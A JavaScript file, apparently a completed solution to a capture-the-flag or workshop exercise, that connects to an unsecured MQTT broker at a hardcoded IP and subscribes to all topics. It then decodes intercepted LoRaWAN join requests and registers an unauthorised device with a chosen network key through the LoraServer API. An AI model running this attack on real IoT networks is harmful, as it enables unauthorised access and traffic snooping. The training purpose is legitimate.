const api = require('./api/api');
const utils = require('./utils');
const mqtt = require('mqtt');
const Logger = require('./log/logger');
const JoinRequestPacketDecoder = require('./join-request-packet-decoder');

const GATEWAY_RX_TOPIC_REGEX = new RegExp("^gateway/([0-9a-fA-F]+)/rx$");

const RAK811_DEVICE_PROFILE_ID = '1d99a006-e617-4fb3-9ffe-a71567ee36a7';
const LORA_APPLICATION_ID = 1;
const VALID_APP_EUI = utils.hexStringToBytes('42:42:42:42:42:42:42:42');

// TODO Step 0
const DEVICE_EUI = utils.hexStringToBytes("13:37:00:00:FF:FF:FF:00");
const DEVICE_NETWORK_KEY = "42424242424242424242424242424242";

const logger = Logger.child({service: 'index'});

let client;

/**
 * Step 1
 */
let init = () => {

// TODO Step 1: Connect to the city's remote MQTT Broker
// Using the provided MQTT client, connect to the remote MQTT broker (cf README.md)
// Don't forget to manually set your clientId, otherwise your step wont be validated!
// Those idiots forgot to put any security on it... Noobs!
// MQTT Client documentation => https://github.com/mqttjs/MQTT.js
// You want to listen to all incoming messages... Did I hear the word "Wildcard"?
  client = mqtt.connect('mqtt://5.135.162.148:1883', {clientId: 'hacker-1234'});
  client.on('connect', () => {
    logger.info("Connected to broker!");
    client.subscribe("#");
  });
  client.on("message", onMessage);
};

/**
 * Step 2
 * @param topic
 * @param message
 */
let onMessage = async (topic, message) => {
  if (!GATEWAY_RX_TOPIC_REGEX.test(topic)) {
    return;
  }
  // TODO Step 2: 
  // We are only interested in the join request packets.
  // Problem is: those packets are encoded... Therefore we need to use a decoder.
  // You need to implement the PacketDecoder code of course!
  // How? RTFM => README.md
  let msgDecoder = new JoinRequestPacketDecoder(topic, message);
  if (!msgDecoder.isSupported()) {
    return;
  }
  logger.debug("Join Request identified");
  let decodedJoinRequest = msgDecoder.decode();
  logger.debug("Decoded:" + JSON.stringify(decodedJoinRequest));
  // Congratulations, you are decoding all the join requests of the LoRa network.
  // However, we want to be smart hackers and only activate your friend's device on the specific APP_EUI 
  if (isValidAppEUI(decodedJoinRequest.appEUI) && isRightDeviceEUI(decodedJoinRequest.devEUI)) {
    logger.debug("AppEUI and DevEUI are valid. Will register device");
    // TODO Step 3:
    // JoinRequest means the device is trying to join the application network.
    // Problem is : The device was never registered in the application network.
    // (It's like a new computer trying to go join a nazily-secured enterprise network 
    // and your sysadmin needs to whitelist your computer's mac address).
    // Therefore we want to interact with the LoraServer API.
    // Thanks to your awesome friend John Doe, you already have a async-client available in api/api.js
    // TODO Step 3.1: register your friend's device remotely
    try {
      if (!await api.deviceExists(decodedJoinRequest.devEUI)) {
        await api.createDevice({
          devEUI: decodedJoinRequest.devEUI,
          applicationID: LORA_APPLICATION_ID,
          deviceProfileID: RAK811_DEVICE_PROFILE_ID,
          name: "Test",
          description: "Test description"
        });
      }
      // TODO Step 3.2: set the device Network key (NwkKey).
      await api.setDeviceNwkKey(decodedJoinRequest.devEUI, DEVICE_NETWORK_KEY);
      logger.debug("Device registered successfully");  
    } catch (e) {
      logger.error("Error occured during device registration:");
      logger.error(e);
    }
    
  }
};

/**
 * Check whether the AppEUI of the intercepted message is the one we want to work on
 * @param msgAppEUI {string|Uint8Array}
 * @returns {boolean}
 */
let isValidAppEUI = (msgAppEUI) => {
  return utils.arraysEqual((typeof msgAppEUI === 'string') ? utils.hexStringToBytes(msgAppEUI) : msgAppEUI, VALID_APP_EUI);
};

/**
 * Check whether the DeviceEUI equals the team's device.
 * If you don't implement this right, you might give a head start to all your competitors!
 * @param devEUI {string|Uint8Array}
 * @returns {boolean}
 */
let isRightDeviceEUI = (devEUI) => {
  return utils.arraysEqual((typeof devEUI === 'string') ? utils.hexStringToBytes(devEUI) : devEUI, DEVICE_EUI);
};

init();